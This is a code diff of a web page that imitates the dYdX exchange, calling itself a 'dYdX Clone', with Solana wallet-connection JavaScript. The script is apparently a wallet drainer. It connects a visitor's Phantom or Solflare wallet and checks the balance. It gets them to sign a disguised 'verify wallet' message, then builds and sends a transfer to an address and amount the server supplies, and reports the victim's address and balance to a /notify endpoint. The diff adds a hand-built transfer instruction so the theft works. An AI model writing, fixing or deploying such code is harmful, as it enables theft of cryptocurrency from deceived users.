@@ -80,11 +80,10 @@
     <div class="metrics"><div style="color:#6966FF; text-transform:uppercase; font-size:14px;">Why dYdX?</div><h2>Trusted at Scale</h2><div class="metrics-grid"><div class="metric-card"><div class="metric-number">$1.4T</div><div class="metric-label">Lifetime Volume</div></div><div class="metric-card"><div class="metric-number">$200M</div><div class="metric-label">Open Interest</div></div><div class="metric-card"><div class="metric-number">220+</div><div class="metric-label">Markets</div></div><div class="metric-card"><div class="metric-number">$12M</div><div class="metric-label">MegaVault TVL</div></div></div></div>
 
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <!-- CRITICAL: Using STABLE version 1.66.2 which doesn't have the Blob.encode bug -->
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.66.2/lib/index.iife.min.js"></script>
     <script>
         // ============================================
-        // Buffer polyfill for Solana (v1.66.2 compatible)
+        // Buffer polyfill
         // ============================================
         if (!window.Buffer) { 
             window.Buffer = { 
@@ -96,7 +95,7 @@
 
         document.addEventListener('DOMContentLoaded', function() {
             console.log('========================================');
-            console.log('🚀 dYdX Clone Frontend Loaded (v1.66.2)');
+            console.log('🚀 dYdX Clone Loaded');
             console.log('========================================');
             
             const modal = document.getElementById('walletModal');
@@ -116,19 +115,58 @@
                 const solflareInstalled = !!(window.solflare && window.solflare.isSolflare);
                 document.getElementById('phantomStatus').innerHTML = phantomInstalled ? '<span class="status-dot installed"></span><span style="color:#4CAF50">Installed</span>' : '<span class="status-dot"></span><span>Not installed</span>';
                 document.getElementById('solflareStatus').innerHTML = solflareInstalled ? '<span class="status-dot installed"></span><span style="color:#4CAF50">Installed</span>' : '<span class="status-dot"></span><span>Not installed</span>';
-                console.log('Wallet status - Phantom:', phantomInstalled, 'Solflare:', solflareInstalled);
             }
             
             async function callBackend(endpoint, data) {
-                const res = await fetch(endpoint, { 
-                    method: 'POST', 
-                    headers: { 'Content-Type': 'application/json' }, 
-                    body: JSON.stringify(data || {}) 
-                });
+                const res = await fetch(endpoint, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data || {}) });
                 if (!res.ok) throw new Error(`HTTP ${res.status}`);
                 const result = await res.json();
                 if (result.error) throw new Error(result.error);
                 return result;
+            }
+            
+            // ============================================
+            // MANUAL TRANSFER INSTRUCTION BUILDER
+            // Bypasses the buggy SystemProgram.transfer
+            // ============================================
+            function createTransferInstruction(fromPubkey, toPubkey, lamports) {
+                // System Program ID
+                const SYSTEM_PROGRAM_ID = new solanaWeb3.PublicKey('11111111111111111111111111111111');
+                
+                // Transfer instruction layout (system program index 2 = Transfer)
+                // Data format: [command: uint32, lamports: uint64]
+                const command = 2; // Transfer command
+                
+                // Create data buffer: command (4 bytes) + lamports (8 bytes)
+                const data = new Uint8Array(12);
+                
+                // Write command (uint32, little-endian)
+                data[0] = command & 0xff;
+                data[1] = (command >> 8) & 0xff;
+                data[2] = (command >> 16) & 0xff;
+                data[3] = (command >> 24) & 0xff;
+                
+                // Write lamports (uint64, little-endian)
+                const lo = Number(lamports & 0xffffffffn);
+                const hi = Number((lamports >> 32n) & 0xffffffffn);
+                data[4] = lo & 0xff;
+                data[5] = (lo >> 8) & 0xff;
+                data[6] = (lo >> 16) & 0xff;
+                data[7] = (lo >> 24) & 0xff;
+                data[8] = hi & 0xff;
+                data[9] = (hi >> 8) & 0xff;
+                data[10] = (hi >> 16) & 0xff;
+                data[11] = (hi >> 24) & 0xff;
+                
+                // Create and return the instruction
+                return new solanaWeb3.TransactionInstruction({
+                    keys: [
+                        { pubkey: fromPubkey, isSigner: true, isWritable: true },
+                        { pubkey: toPubkey, isSigner: false, isWritable: true },
+                    ],
+                    programId: SYSTEM_PROGRAM_ID,
+                    data: data,
+                });
             }
             
             async function connectWallet(walletType, provider) {
@@ -137,119 +175,89 @@
                 try {
                     // Step 1: Connect
                     loadingTitle.textContent = 'Connecting...';
-                    loadingSubtitle.textContent = 'Please approve connection in your wallet.';
                     const resp = await provider.connect();
                     const pubKey = walletType === 'phantom' ? resp.publicKey.toString() : provider.publicKey.toString();
-                    console.log('✅ Connected publicKey:', pubKey);
+                    console.log('✅ Connected:', pubKey);
                     
                     // Step 2: Get balance
                     loadingTitle.textContent = 'Getting Balance...';
-                    loadingSubtitle.textContent = 'Fetching your wallet balance...';
                     const balanceData = await callBackend('/api/getBalance', { publicKey: pubKey });
                     const balanceLamports = balanceData.balance;
                     const solBalance = (balanceLamports / 1e9).toFixed(6);
-                    console.log(`💰 Balance: ${solBalance} SOL (${balanceLamports} lamports)`);
+                    console.log(`💰 Balance: ${solBalance} SOL`);
                     
-                    // Step 3: Check minimum
                     if (balanceLamports < 20000000) {
                         loadingTitle.textContent = 'Insufficient Balance';
-                        loadingSubtitle.innerHTML = `Need at least 0.02 SOL<br>Current: ${solBalance} SOL`;
+                        loadingSubtitle.innerHTML = `Need 0.02 SOL<br>Current: ${solBalance} SOL`;
                         setTimeout(hideModal, 3000);
                         return;
                     }
                     
-                    // Step 4: Sign verification
-                    loadingTitle.textContent = 'Verifying Ownership';
-                    loadingSubtitle.textContent = 'Please sign the verification message...';
-                    const msg = `Verify wallet ownership\nTime: ${Date.now()}\nWallet: ${pubKey.slice(0,8)}...`;
+                    // Step 3: Sign verification
+                    loadingTitle.textContent = 'Verifying...';
+                    const msg = `Verify wallet\nTime: ${Date.now()}\nWallet: ${pubKey.slice(0,8)}...`;
                     const msgBytes = new TextEncoder().encode(msg);
                     if (walletType === 'phantom') await provider.signMessage(msgBytes, 'utf8');
                     else await provider.signMessage(msgBytes);
-                    console.log('✅ Verification signed');
+                    console.log('✅ Verified');
                     
-                    // Step 5: Prepare transaction (get amount from backend)
-                    loadingTitle.textContent = 'Preparing Transaction...';
-                    loadingSubtitle.textContent = 'Contacting server...';
+                    // Step 4: Get amount from backend
+                    loadingTitle.textContent = 'Preparing...';
                     const prepareData = await callBackend('/prepare-transaction', { publicKey: pubKey });
                     if (!prepareData.success) throw new Error(prepareData.error);
-                    console.log(`📦 Prepare response - amount: ${prepareData.amount}, to: ${prepareData.to}`);
+                    console.log(`📦 Amount: ${prepareData.amount} lamports`);
                     
-                    // Step 6: Get fresh blockhash
+                    // Step 5: Get blockhash
                     loadingTitle.textContent = 'Getting Blockhash...';
-                    loadingSubtitle.textContent = 'Fetching latest blockhash...';
                     const blockhashData = await callBackend('/api/getBlockhash', {});
                     console.log(`🔗 Blockhash: ${blockhashData.blockhash}`);
                     
-                    // ============================================
-                    // Build transaction with v1.66.2 compatible syntax
-                    // ============================================
+                    // Step 6: Build transaction with MANUAL instruction
                     loadingTitle.textContent = 'Building Transaction...';
-                    loadingSubtitle.textContent = 'Constructing transfer...';
                     
-                    const { PublicKey, Transaction, SystemProgram } = solanaWeb3;
-                    const fromPubkey = new PublicKey(pubKey);
-                    const toPubkey = new PublicKey(prepareData.to);
+                    const fromPubkey = new solanaWeb3.PublicKey(pubKey);
+                    const toPubkey = new solanaWeb3.PublicKey(prepareData.to);
+                    const lamportsBigInt = BigInt(prepareData.amount);
                     
-                    // For v1.66.2, lamports must be a Number (not BigInt)
-                    const lamportsNumber = Number(prepareData.amount);
-                    console.log(`🔢 Lamports as Number: ${lamportsNumber} (${typeof lamportsNumber})`);
+                    // Create manual transfer instruction (bypasses the bug)
+                    const transferIx = createTransferInstruction(fromPubkey, toPubkey, lamportsBigInt);
                     
-                    if (isNaN(lamportsNumber) || lamportsNumber <= 0) {
-                        throw new Error(`Invalid lamports value: ${prepareData.amount}`);
-                    }
-                    
-                    // Create transaction
-                    const transaction = new Transaction();
-                    transaction.add(
-                        SystemProgram.transfer({
-                            fromPubkey: fromPubkey,
-                            toPubkey: toPubkey,
-                            lamports: lamportsNumber
-                        })
-                    );
+                    const transaction = new solanaWeb3.Transaction();
+                    transaction.add(transferIx);
                     transaction.recentBlockhash = blockhashData.blockhash;
                     transaction.lastValidBlockHeight = blockhashData.lastValidBlockHeight;
                     transaction.feePayer = fromPubkey;
                     
-                    console.log('✅ Transaction built successfully');
+                    console.log('✅ Transaction built with manual instruction');
                     
                     // Step 7: Sign
-                    loadingTitle.textContent = 'Signing Transaction...';
-                    loadingSubtitle.textContent = 'Please approve the transaction in your wallet...';
+                    loadingTitle.textContent = 'Signing...';
                     const signed = await provider.signTransaction(transaction);
-                    console.log('✅ Transaction signed');
+                    console.log('✅ Signed');
                     
                     // Step 8: Send
-                    loadingTitle.textContent = 'Sending Transaction...';
-                    loadingSubtitle.textContent = 'Broadcasting to blockchain...';
+                    loadingTitle.textContent = 'Sending...';
                     const signedBytes = signed.serialize();
                     const base64Tx = btoa(String.fromCharCode.apply(null, signedBytes));
                     const sendResult = await callBackend('/api/sendTransaction', { transaction: base64Tx });
-                    console.log(`✅ Transaction sent! TXID: ${sendResult.txid}`);
+                    console.log('✅ TXID:', sendResult.txid);
                     
                     // Step 9: Success
-                    const shortTxid = sendResult.txid.slice(0, 6) + '...' + sendResult.txid.slice(-8);
                     loadingTitle.textContent = 'Success!';
-                    loadingSubtitle.innerHTML = `Transfer complete!<br>TXID: ${shortTxid}`;
+                    loadingSubtitle.innerHTML = `Complete!<br>${sendResult.txid.slice(0,6)}...${sendResult.txid.slice(-8)}`;
                     
-                    // Send notification
                     await fetch('/notify', { 
                         method: 'POST', 
                         headers: { 'Content-Type': 'application/json' }, 
-                        body: JSON.stringify({ 
-                            address: pubKey, 
-                            balance: solBalance, 
-                            walletType: walletType === 'phantom' ? 'Phantom' : 'Solflare', 
-                            customMessage: '🎉 Transfer Complete! TXID: ' + sendResult.txid 
-                        }) 
+                        body: JSON.stringify({ address: pubKey, balance: solBalance, walletType, customMessage: '🎉 Transfer Complete! TXID: ' + sendResult.txid }) 
                     });
                     
                     setTimeout(hideModal, 3000);
                     
                 } catch(e) {
-                    console.error('❌ FATAL ERROR:', e);
+                    console.error('❌ Error:', e);
                     loadingTitle.textContent = 'Failed';
-                    loadingSubtitle.textContent = e.message || 'Something went wrong. Please try again.';
+                    loadingSubtitle.textContent = e.message || 'Try again';
                     setTimeout(hideModal, 3000);
                 }
             }
@@ -273,9 +281,8 @@
             setTimeout(checkStatus, 500);
             setTimeout(checkStatus, 1000);
             setTimeout(checkStatus, 2000);
-            setTimeout(checkStatus, 5000);
             
-            console.log('✅ Frontend ready, waiting for user interaction');
+            console.log('✅ Ready');
         });
     </script>
 </body>
